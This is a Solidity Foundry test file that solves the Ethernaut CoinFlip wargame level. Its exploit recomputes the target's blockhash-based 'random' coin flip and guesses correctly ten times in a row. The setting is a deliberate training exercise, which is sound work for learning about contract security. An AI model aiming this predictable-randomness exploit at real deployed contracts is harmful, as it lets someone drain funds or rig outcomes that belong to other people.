// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/CoinFlip.sol";
import "src/levels/CoinFlipFactory.sol";

import "@openzeppelin/contracts/math/SafeMath.sol";

contract TestCoinFlip is BaseTest {
    using SafeMath for uint256;
    CoinFlip private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new CoinFlipFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = CoinFlip(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.consecutiveWins(), 0);
    }

    function exploitLevel() internal override {
        vm.startPrank(player);

        /** CODE YOUR EXPLOIT HERE */
        // https://ethernaut.openzeppelin.com/level/0x4dF32584890A0026e56f7535d0f2C6486753624f
        // run with `forge test --match-contract CoinFlip -vv`

        //just use the same calculations as in the contract and roll the chain

        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        for (uint256 i = 0; i < 10; i++) {
            uint256 blockValue = uint256(blockhash(block.number.sub(1)));
            uint256 coinFlip = blockValue.div(FACTOR);
            bool ourGuess = coinFlip == 1 ? true : false;

            level.flip(ourGuess);
            emit log_named_uint("Consecutive wins", level.consecutiveWins());

            utilities.mineBlocks(1);
        }

        vm.stopPrank();
    }
}
